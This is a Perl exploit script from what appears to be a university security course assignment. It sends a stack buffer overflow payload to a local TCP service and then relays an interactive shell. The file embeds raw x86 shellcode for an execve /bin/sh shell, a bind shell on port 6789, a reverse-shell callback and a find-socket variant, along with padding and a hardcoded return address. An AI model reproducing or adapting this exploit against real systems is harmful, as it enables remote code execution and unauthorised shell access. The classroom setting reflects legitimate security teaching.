#!/usr/bin/perl
#--------------------------------------------
# Name: 
# Class: CS4678
# Assignment 5
# File: exploit.pl
# Last modified: 12 Feb 2012
#--------------------------------------------
#

$buffer = "\x30\xf1\xff\xbf\n";

# lsod_shellcode.asm  - from class resources
# lsod_shellcode  24 bytes payload, 260 bytes of padding
$shellcode =  
        "\x31\xC0\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89" .
		"\xE3\x50\x53\x89\xE1\x99\xB0\x0B\xCD\x80";

# bindsckcode.asm  - from class resources
# bindsckcode  73 bytes payload, 24 bytes spawn shell = 187 bytes padding
#    server on port 6789  (\x1A  \x85)
$shellcode1 = 
	"\x31\xC0\x50\x68\x02\x00\x1A\x85\x89\xE7\x50\x6A\x01\x6A\x02\x89" .
	"\xE1\xB0\x66\x31\xDB\x43\xCD\x80\x6A\x10\x57\x50\x89\xE1\xB0\x66" .
	"\x43\xCD\x80\xB0\x66\xB3\x04\x89\x44\x24\x04\xCD\x80\x31\xC0\x83" .
	"\xC4\x0C\x50\x50\xB0\x66\x43\xCD\x80\x89\xC3\x31\xC9\xB1\x03\x31" .
	"\xC0\xB0\x3F\x49\xCD\x80\x41\xE2\xF6";
	
# callback.asm  -  from class resources
# callback   67 bytes payload, 24 bytes spaw shell = 193 bytes padding
#    connects to 127.0.0.1:6789  (\x7F\x00\x00\x01)  (\x1A \x85)
$shellcode2 = 
	"\x83\xEC\x30\x31\xC0\x50\x50\xBB\x7F\x00\x00\x01\x53\xBB\x03\x01" .
	"\x1A\x85\x66\x81\xF3\x01\x01\x53\x89\xE7\x50\x6A\x01\x6A\x02\x89" .
	"\xE1\xB0\x66\x31\xDB\x43\xCD\x80\x6A\x10\x57\x50\x89\xE1\xB3\x03" .
	"\xB0\x66\xCD\x80\x5B\x31\xC9\xB1\x03\x31\xC0\xB0\x3F\x49\xCD\x80" .
	"\x41\xE2\xF6";

# findsckcode.asm  -  from class resources
# findsckcode  73 bytes payload, 24 bytes spawn shell = 187 bytes padding
#    need to connect via client port 7777
$shellcode3 = 
	"\x31\xDB\x89\xE7\x8D\x77\x10\x89\x77\x04\x8D\x4F\x20\x89\x4F\x08" .
	"\xB3\x10\x89\x19\x31\xC9\xB1\xFF\x89\x0F\x51\x31\xC0\xB0\x66\xB3" .
	"\x07\x89\xF9\xCD\x80\x59\x31\xDB\x39\xC3\x75\x0B\x42\x66\xBB\x61" .
	"\x1E\x66\x39\x5E\x02\x74\x02\xE2\xDF\x89\xCB\x31\xC9\xB1\x03\x31" .
	"\xC0\xB0\x3F\x49\xCD\x80\x41\xE2\xF6";

use Getopt::Long;
my $bindsock - '';	# option variable with default value (false)
my $callback = '';	# option variable with default value (false)
my $findsock = '';	# option variable with default value (false)
GetOptions ('bindsock' => \$bindsock, 
            'callback' => \$callback,
            'findsock' => \$findsock,); 

use IO::Socket; 
my $sock = new IO::Socket::INET ( 
	PeerAddr => '127.0.0.1', 
	LocalPort => '7777',
	PeerPort => '3333', 
	Proto => 'tcp', 
); 
die "Could not create socket: $!\n" unless $sock; 

$sock->autoflush(1);              # so output gets there right away
print "\t *** TCP Connection Success!\n";

# read data from server
$data = <$sock>;
print "$data";
print "\t *** CONTINUE? ";
$data = <>;
$data = <$sock>;
print "$data";
# send exploit
print "\t *** Sending exploit to server\n";

# location depends on stack (aslr, env)
if ($bindsock) {
	print $sock "$shellcode1" . "$shellcode" . "A"x187 . $buffer;
} elsif ($callback) {
	print $sock "$shellcode2" . "$shellcode" . "A"x193 . $buffer;
} elsif ($findsock) {
	print $sock "$shellcode3" . "$shellcode" . "A"x187 . $buffer;
} else {
	print $sock "$shellcode" . "A"x260 . $buffer;	
}


# location used jmp esp in ld-2.13.so (null byte ok) base @ 0x110000
# print $sock "A"x284 . "\x3d\xda\x82\x00" . "$shellcode" . "\n";



#read data from server

# split the program into two processes, identical twins
die "can't fork: $!" unless defined($kidpid = fork());

# the if{} block runs only in the parent process
if ($kidpid) {
	# copy the socket to standard output
	while (defined ($line = <$sock>)) {
	    print STDOUT $line;
	}
	kill("TERM", $kidpid);                  # send SIGTERM to child
}
# the else{} block runs only in the child process
else {
	# copy standard input to the socket
	while (defined ($line = <STDIN>)) {
	    print $sock $line;
	}
}

close($sock);

